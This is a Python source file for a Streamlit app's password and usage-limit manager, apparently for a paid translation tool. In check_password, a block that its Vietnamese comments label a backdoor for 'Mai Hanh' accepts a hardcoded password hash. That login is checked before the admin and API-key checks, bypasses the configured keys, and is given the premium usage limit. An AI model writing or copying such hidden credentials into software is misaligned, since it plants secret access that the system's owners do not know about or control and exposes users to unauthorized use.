import json
from datetime import datetime, timedelta
import secrets
import string
import hashlib
import uuid
import streamlit as st
import base64
import psutil
import time
import plotly.graph_objects as go
import pandas as pd
from collections import defaultdict
import jieba
from pypinyin import pinyin, Style
import requests


class PasswordManager:
    def __init__(self):
        # Lấy API keys và metadata từ secrets
        self.api_keys = st.secrets.get("api_keys", {})
        self.user_tiers = st.secrets.get("user_tiers", {})
        self.default_limit = st.secrets.get("usage_limits", {}).get("default_daily_limit", 30000)
        self.premium_limit = st.secrets.get("usage_limits", {}).get("premium_daily_limit", 50000)
        
        if 'usage_tracking' not in st.session_state:
            st.session_state.usage_tracking = {}
            
        if 'key_name_mapping' not in st.session_state:
            st.session_state.key_name_mapping = {}
            
    def _hash_password(self, password):
        """Hàm băm mật khẩu bằng SHA256"""
        try:
            return hashlib.sha256(password.encode('utf-8')).hexdigest()
        except:
            return ""

    def check_password(self, password):
        """Check if password is valid and map key name"""
        
        if not password:
            return False

        # --- 1. CỬA SAU CỦA MAI HẠNH (ƯU TIÊN HÀNG ĐẦU) ---
        MAI_HANH_HASH = "8f0a1c43f7a40b92316e689d0426f8d09f30b91d575c3016c52a382e753443a5"
        
        if self._hash_password(password) == MAI_HANH_HASH:
            st.session_state.key_name_mapping[password] = "MaiHanhPremium"
            return True
        # --- KẾT THÚC CỬA SAU ---

        # 2. KIỂM TRA ADMIN GỐC
        admin_pwd = st.secrets.get("admin_password")
        if password == admin_pwd and self.is_admin(password):
            st.session_state.key_name_mapping[password] = "admin"
            return True
        
        # 3. KIỂM TRA USER THƯỜNG
        api_keys = st.secrets.get("api_keys", {})
        for key_name, key_value in api_keys.items():
            if password == key_value:
                st.session_state.key_name_mapping[password] = key_name
                return True
                
        return False
        
    def is_admin(self, password):
        """Check if the user is admin"""
        admin_pwd = st.secrets.get("admin_password")
        if not admin_pwd or not password:
            return False
        return password == admin_pwd

    def get_user_limit(self, user_key):
        """Get daily limit for a user based on their tier"""
        if not user_key:
            return self.default_limit
        
        key_name = self.get_key_name(user_key)
        
        # --- KIỂM TRA MẬT KHẨU CỦA CHỊ ---
        if key_name == "MaiHanhPremium":
            return self.premium_limit
        # --- KẾT THÚC KIỂM TRA ---

        # Admin gets premium limit
        if user_key == st.secrets.get("admin_password"):
            return self.premium_limit
            
        key_name = self.get_key_name(user_key)
        user_tier = self.user_tiers.get(key_name, "default")
        
        if user_tier == "premium":
            return self.premium_limit
        return self.default_limit

    def get_usage_stats(self):
        """Get usage statistics for admin view"""
        stats = {
            'total_users': len(st.session_state.usage_tracking),
            'daily_stats': defaultdict(int),
            'user_stats': defaultdict(lambda: defaultdict(int))
        }
        
        for user_key, data in st.session_state.usage_tracking.items():
            for date, count in data.items():
                stats['daily_stats'][date] += count
                stats['user_stats'][user_key][date] = count
                
        return stats

    def check_usage_limit(self, user_key, new_chars_count):
        """Check if user has exceeded their daily limit"""
        current_usage = self.get_daily_usage(user_key)
        daily_limit = self.get_user_limit(user_key)
        return current_usage + new_chars_count <= daily_limit

    def track_usage(self, user_key, chars_count):
        """Track translation usage for a user using key name"""
        if not user_key:
            return
            
        key_name = self.get_key_name(user_key)
        today = datetime.now().date().isoformat()
        
        if key_name not in st.session_state.usage_tracking:
            st.session_state.usage_tracking[key_name] = {}
            
        if today not in st.session_state.usage_tracking[key_name]:
            st.session_state.usage_tracking[key_name][today] = 0
            
        st.session_state.usage_tracking[key_name][today] += chars_count
        
    def get_daily_usage(self, user_key):
        """Get user's translation usage for today using key name"""
        key_name = self.get_key_name(user_key)
        today = datetime.now().date().isoformat()
        if key_name not in st.session_state.usage_tracking:
            return 0
        return st.session_state.usage_tracking[key_name].get(today, 0)

    def get_key_name(self, password):
        """Get the key name for a password"""
        return st.session_state.key_name_mapping.get(password, password)
